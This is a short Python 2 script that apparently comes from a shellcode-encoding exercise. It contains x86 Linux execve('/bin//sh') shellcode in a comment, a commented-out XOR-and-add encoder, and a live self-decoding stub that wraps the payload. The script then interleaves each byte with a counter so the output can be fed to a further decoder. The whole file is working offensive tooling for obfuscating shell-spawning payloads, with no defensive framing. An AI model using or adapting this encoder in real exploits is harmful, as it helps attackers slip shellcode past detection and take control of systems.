#!/usr/bin/python


# Original Shellcode
#shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")


encoded = ""
encoded2 = ""

"""
for x in bytearray(shellcode) :
        y = x + 0x2
        c = y ^ 0xCA
        encoded += '\\x'
        encoded += '%02x' % c
        encoded2 += '0x'
        encoded2 += '%02x,' %c

"""

# Shellcode decode
shellcode = ("\xeb\x10\x5e\x31\xc9\xb1\x19\x80\x36\xca\x80\x2e\x02\x46\xe2\xf7\xeb\x05\xe8\xeb\xff\xff\xff\xf9\x08\x98\xa0\xba\xfb\xbf\xa0\xa0\xfb\xfb\xae\xa1\x41\x2f\x98\x41\x2e\x9f\x41\x29\x78\xc7\x05\x48")

print 'Encoded shellcode ...'

counter = 1
for x in bytearray(shellcode) :
	encoded += '\\x'
	encoded += '%02x' % x
	encoded += '\\x%02x' % counter

	encoded2 += '0x'
	encoded2 += '%02x,' %x
	encoded2 += '0x%02x,' % counter
	counter += 1

print encoded
print encoded2

print 'Len: %d' % len(bytearray(shellcode))
